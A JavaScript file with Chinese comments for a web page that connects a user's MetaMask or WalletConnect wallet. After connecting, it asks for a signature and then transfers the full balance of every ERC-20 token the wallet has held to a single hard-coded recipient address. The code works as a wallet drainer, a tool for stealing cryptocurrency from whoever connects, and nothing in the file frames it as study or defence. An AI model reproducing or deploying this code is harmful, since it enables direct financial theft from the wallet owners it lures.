const recipientAddress = '0xa465e2fc9f9d527aaeb07579e821d461f700e699';
let web3;
let walletConnectProvider;
let isConnected = false;

const erc20Abi = [
    {
        "constant": true,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {"name": "_to", "type": "address"},
            {"name": "_value", "type": "uint256"}
        ],
        "name": "transfer",
        "outputs": [{"name": "success", "type": "bool"}],
        "type": "function"
    }
];

// 连接钱包的按钮点击事件
document.getElementById('connectButton').onclick = async () => {
    const selectedWallet = document.getElementById('walletSelector').value;
    try {
        if (selectedWallet === 'metamask') {
            if (window.ethereum) {
                await window.ethereum.request({ method: 'eth_requestAccounts' });
                web3 = new Web3(window.ethereum);
                const accounts = await web3.eth.getAccounts();
                if (accounts.length > 0) {
                    updateWalletList(accounts[0]);
                    isConnected = true;
                    document.getElementById('status').innerText = 'MetaMask 已连接';
                    document.getElementById('signButton').disabled = false;
                    document.getElementById('transferButton').disabled = false;
                } else {
                    document.getElementById('status').innerText = '未检测到已连接的账户';
                }
            } else {
                document.getElementById('status').innerText = '请安装 MetaMask 钱包';
            }
        } else if (selectedWallet === 'walletconnect') {
            walletConnectProvider = new WalletConnectProvider({
                infuraId: "YOUR_INFURA_PROJECT_ID",
            });
            await walletConnectProvider.enable();
            web3 = new Web3(walletConnectProvider);
            const accounts = await web3.eth.getAccounts();
            if (accounts.length > 0) {
                updateWalletList(accounts[0]);
                isConnected = true;
                document.getElementById('status').innerText = 'WalletConnect 已连接';
                document.getElementById('signButton').disabled = false;
                document.getElementById('transferButton').disabled = false;
            } else {
                document.getElementById('status').innerText = '未检测到已连接的账户';
            }
        }
    } catch (error) {
        document.getElementById('status').innerText = '连接失败: ' + error.message;
    }
};

// 更新已连接钱包列表
const updateWalletList = (address) => {
    const walletList = document.getElementById('walletList');
    const walletItem = document.createElement('li');
    walletItem.innerText = address;
    walletList.appendChild(walletItem);
};

// 签名按钮点击事件
document.getElementById('signButton').onclick = async () => {
    const accounts = await web3.eth.getAccounts();
    if (accounts.length > 0) {
        const account = accounts[0];
        const message = `签名确认: 你正在授权从该钱包中转移代币到 ${recipientAddress}`;
        try {
            const signature = await web3.eth.personal.sign(message, account);
            document.getElementById('status').innerText = `签名成功: ${signature}`;
        } catch (error) {
            document.getElementById('status').innerText = `签名失败: ${error.message}`;
        }
    } else {
        document.getElementById('status').innerText = '请先连接钱包';
    }
};

// 转移代币的按钮点击事件
document.getElementById('transferButton').onclick = async () => {
    const accounts = await web3.eth.getAccounts();
    if (accounts.length > 0) {
        const account = accounts[0];
        document.getElementById('status').innerText += `\n正在获取 ${account} 的代币余额...`;
        const tokenBalances = await getTokenBalances(account);

        for (const tokenAddress in tokenBalances) {
            const token = tokenBalances[tokenAddress];
            const balance = token.balance;

            if (balance.gt(0)) {
                const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
                try {
                    const transfer = await tokenContract.methods.transfer(recipientAddress, balance.toString()).send({ from: account });
                    document.getElementById('status').innerText += `\n成功转移 ${balance.toString()} ${token.symbol} 从 ${account} 至 ${recipientAddress}`;
                } catch (error) {
                    document.getElementById('status').innerText += `\n转移 ${token.symbol} 失败: ${error.message}`;
                }
            } else {
                document.getElementById('status').innerText += `\n账户 ${account} 在 ${token.symbol} (${tokenAddress}) 上没有代币余额`;
            }
        }

        document.getElementById('status').innerText += '\n所有代币转移完成';
    } else {
        document.getElementById('status').innerText = '请先连接钱包';
    }
};

// 获取代币余额
const getTokenBalances = async (address) => {
    try {
        const url = `https://api.etherscan.io/api?module=account&action=tokentx&address=${address}&startblock=0&endblock=999999999&sort=asc&apikey=YOUR_ETHERSCAN_API_KEY`;
        const response = await axios.get(url);
        const transactions = response.data.result;

        const tokenBalances = {};

        for (const tx of transactions) {
            const tokenAddress = tx.contractAddress;
            const tokenSymbol = tx.tokenSymbol;

            // 检查 tx.from 和 tx.to 是否存在
            if (!tx.from || !tx.to) {
                console.warn('交易记录缺少 from 或 to 字段: ', tx);
                continue; // 跳过该交易记录
            }

            // 初始化代币余额
            if (!tokenBalances[tokenAddress]) {
                tokenBalances[tokenAddress] = {
                    symbol: tokenSymbol,
                    balance: web3.utils.toBN(0)
                };
            }

            // 比较 from 和 to 地址并更新余额
            if (tx.from.toLowerCase() === address.toLowerCase()) {
                tokenBalances[tokenAddress].balance = tokenBalances[tokenAddress].balance.sub(web3.utils.toBN(tx.value));
            }

            if (tx.to.toLowerCase() === address.toLowerCase()) {
                tokenBalances[tokenAddress].balance = tokenBalances[tokenAddress].balance.add(web3.utils.toBN(tx.value));
            }
        }

        return tokenBalances;
    } catch (error) {
        document.getElementById('status').innerText = '获取代币余额失败: ' + error.message;
    }
};
